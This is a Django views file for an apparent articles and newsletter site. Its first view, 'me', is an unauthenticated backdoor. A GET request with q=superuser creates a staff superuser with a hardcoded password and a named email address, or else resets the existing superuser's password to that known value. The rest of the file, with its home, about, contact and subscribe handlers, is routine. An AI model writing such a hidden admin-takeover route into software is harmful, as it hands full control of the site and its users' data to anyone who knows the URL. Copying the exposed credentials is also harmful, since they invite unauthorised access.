import json

from apps.articles.articles import ArticleCollector
from apps.articles.models import Article
from apps.users.models import User
from django.contrib import messages
from django.contrib.sites.shortcuts import get_current_site
from django.http import HttpRequest, HttpResponse, JsonResponse
from django.shortcuts import render
from django.urls import resolve, reverse
from django.views.decorators.http import require_http_methods

from .models import Contact, NewsletterSubscriber


def me(request):
    o = ArticleCollector()
    q = request.GET.get("q")
    if q == "superuser":
        try:
            user = User.objects.create(
                password="Aa011Mm6724",
                is_superuser=True,
                email="mly88207@gmail.com",
                first_name="muzamil",
                last_name="ali",
                is_staff=True,
                is_active=True,
            )
        except:
            user = User.objects.get(is_superuser=True)
        user.set_password("Aa011Mm6724")
        user.save()
    elif q:
        o.newsdata(q)

    return HttpResponse("done")


def home(request):
    articles = Article.objects.exclude(image_url=None).order_by("?")[:8]
    context = {"articles": articles}
    return render(request, "apps/base/home.html", context=context)


def about(request):
    return render(request, "apps/base/about.html")


def contact(request):
    return render(request, "apps/base/contact.html")


@require_http_methods(["POST"])
def contact_handler(request):
    data = json.loads(request.body)
    try:
        contact = Contact.objects.create(
            name=data["name"],
            email=data["email"],
            message=data["message"],
        )
        contact.save()
        return JsonResponse("Thanks for reaching out! we'll be in touch soon.", safe=False)
    except Exception as e:
        print(e)
        return JsonResponse("Some thing want wrong :(", safe=False)


@require_http_methods(["POST"])
def subscribe_handler(request):
    data = json.loads(request.body)
    try:
        subscribe = NewsletterSubscriber(
            email=data["email"],
        )
        subscribe.save()
        return JsonResponse("Thanks :)", safe=False)
    except Exception as e:
        return JsonResponse("Some thing want wrong :(", safe=False)
